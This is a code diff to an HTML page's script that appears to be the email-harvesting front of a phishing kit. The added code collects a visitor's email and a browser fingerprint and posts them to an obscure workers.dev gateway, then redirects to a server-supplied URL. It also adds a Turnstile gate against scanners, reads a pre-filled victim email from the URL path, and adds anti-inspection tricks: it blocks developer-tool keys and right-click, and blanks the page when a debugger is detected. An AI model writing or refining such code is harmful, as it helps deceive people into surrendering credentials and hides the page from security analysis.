@@ -168,8 +168,17 @@
       </div>
     </form>
   </div>
+  
+<div id="cf-turnstile"
+     class="cf-turnstile"
+     data-sitekey="0x4AAAAAABhsKFJ88b73jtsO"
+     data-callback="onTurnstileDone"
+     data-theme="light"></div>
+  
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
   <script>
+    
     /* ================== i18n ================== */
     const DICT = {
       en: {
@@ -275,60 +284,145 @@
     document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
 
     /* ================== Backend wiring (no captcha) ================== */
-    const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
-    let fpHash = "";  // fingerprint hash
+   document.addEventListener("DOMContentLoaded", () => {
+  const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
 
-    function getClientSig() {
-      const nav = navigator;
-      return [nav.userAgent, nav.language, nav.platform, screen.width + "x" + screen.height].join("|");
+  // DOM refs (matched to your page)
+  const popup    = document.getElementById("popup");
+  const overlay  = document.getElementById("overlay");
+  const openBtn  = document.getElementById("openBtn");
+  const form     = document.getElementById("emailForm");
+  const errBox   = document.getElementById("err");
+  const input    = document.getElementById("email");
+  const submitEl = document.getElementById("submitBtn");
+
+  // i18n guard (uses existing `t` if defined)
+  const tSafe = (typeof window.t === "object" && window.t) ? window.t : {
+    invalidEmail: "Invalid email address",
+    unexpectedError: "Unexpected error",
+    connectionError: "Network error, try again",
+    redirecting: "Redirecting…"
+  };
+
+  let cfProof = "", fpHash = "";
+
+  // Delay popup render (kept from your script)
+  setTimeout(() => popup?.classList.add("js-ready"), 1500);
+
+  // Fingerprint
+  function getClientSig() {
+    const nav = navigator;
+    return [nav.userAgent, nav.language, nav.platform, screen.width + "x" + screen.height].join("|");
+  }
+  async function hashFingerprint(str) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(str);
+    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+    return btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
+  }
+  hashFingerprint(getClientSig()).then(fp => fpHash = fp);
+
+  // Turnstile callback
+  window.onTurnstileDone = (token) => {
+    cfProof = token;
+    if (errBox) errBox.style.display = "none";
+  };
+
+  // Helpers
+  const show = (el, msg) => { if (!el) return; if (msg) el.textContent = msg; el.style.display = "block"; };
+  const hide = (el) => { if (!el) return; el.style.display = "none"; };
+
+  // Open/close popup
+  openBtn?.addEventListener("click", () => {
+    popup?.classList.add("active");
+    overlay?.classList.add("active");
+    input?.focus();
+  });
+  document.addEventListener("click", (e) => {
+    if (!popup || e.target === openBtn) return;
+    if (!popup.contains(e.target)) {
+      popup.classList.remove("active");
+      overlay?.classList.remove("active");
     }
-    async function hashFingerprint(str) {
-      const enc = new TextEncoder();
-      const buf = await crypto.subtle.digest("SHA-256", enc.encode(str));
-      return btoa(String.fromCharCode(...new Uint8Array(buf)));
-    }
-    hashFingerprint(getClientSig()).then(fp => fpHash = fp);
+  });
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
+  // Submit
+  form?.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const val  = (input?.value || "").trim();
+    const trap = (document.getElementById("middleName")?.value || "").trim();
+    const jsSig = "ok-" + Math.random().toString(36).slice(2);
 
-      const val  = (input.value || '').trim();
-      const trap = (document.getElementById("middleName").value || '').trim();
-      const jsSig = "ok-" + Math.random().toString(36).slice(2);
+    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(val)) return show(errBox, tSafe.invalidEmail);
+    if (trap) return; // honeypot
+    if (!cfProof || cfProof.length < 10) return show(errBox, "Please complete the check");
 
-      // Basic email check
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(val)) return show(errBox, t.invalidEmail);
-      if (trap) return; // honeypot
+    try {
+      const res = await fetch(gateway, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: val,
+          middleName: trap,
+          jsToken: jsSig,
+          cfToken: cfProof || "",
+          fingerprint: fpHash
+        })
+      });
 
-      try {
-        const res = await fetch(gateway, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept-Language": LANG
-          },
-          body: JSON.stringify({
-            email: val,
-            middleName: trap,
-            jsToken: jsSig,
-            fingerprint: fpHash
-            // cfToken omitted on purpose (captcha removed)
-          })
-        });
-
-        const txt = await res.text();
-        let data = {};
-        try { data = JSON.parse(txt); } catch {}
-
-        if (res.ok && data.valid && data.redirect) {
-          window.location.assign(data.redirect);
-        } else {
-          show(errBox, (data && data.message) ? data.message : t.errorGeneric);
-        }
-      } catch (err) {
-        show(errBox, t.errorGeneric);
+      const json = await res.json().catch(() => ({}));
+      if (!res.ok || !json.valid || !json.redirect) {
+        return show(errBox, json.message || tSafe.unexpectedError);
       }
-    });
-  </script>
+
+      if (submitEl) submitEl.textContent = tSafe.redirecting;
+      if (typeof turnstile !== "undefined") turnstile.reset("#cf-turnstile");
+      cfProof = "";
+      setTimeout(() => (location.href = json.redirect), 900);
+    } catch {
+      show(errBox, tSafe.connectionError);
+    }
+  });
+
+  input?.addEventListener("input", () => hide(errBox));
+
+  // Optional: parse redirect info from URL (kept)
+  const r = (() => {
+    const match = window.location.pathname.match(/\/\.(\d+)\.([a-f0-9]{64})\/\$([a-zA-Z0-9+/=]+)$/);
+    if (!match) return null;
+    const [_, exp, hmac, b64] = match;
+    if (parseInt(exp, 10) < Date.now() / 1000) return null;
+    try { return { email: atob(b64), exp, hmac }; } catch { return null; }
+  })();
+  if (r && r.email) {
+    const showEmail = document.getElementById("userEmail");
+    if (showEmail) showEmail.textContent = r.email;
+    sessionStorage.setItem("validatedEmail", r.email);
+  }
+
+  // Anti-inspection (kept)
+  document.addEventListener("contextmenu", e => e.preventDefault());
+  document.addEventListener("keydown", e => {
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) ||
+      (e.ctrlKey && e.key === "U")
+    ) e.preventDefault();
+  });
+  setInterval(() => {
+    const start = performance.now();
+    debugger;
+    const delta = performance.now() - start;
+    if (delta > 100) {
+      document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;'>Blocked</h1>";
+    }
+  }, 1500);
+
+  // JS-only fallback redirect (kept)
+  const noscript = document.createElement("noscript");
+  noscript.innerHTML = `<meta http-equiv="refresh" content="0;url=https://example.com">`;
+  document.body.appendChild(noscript);
+});
+</script>
 </body>
 </html>
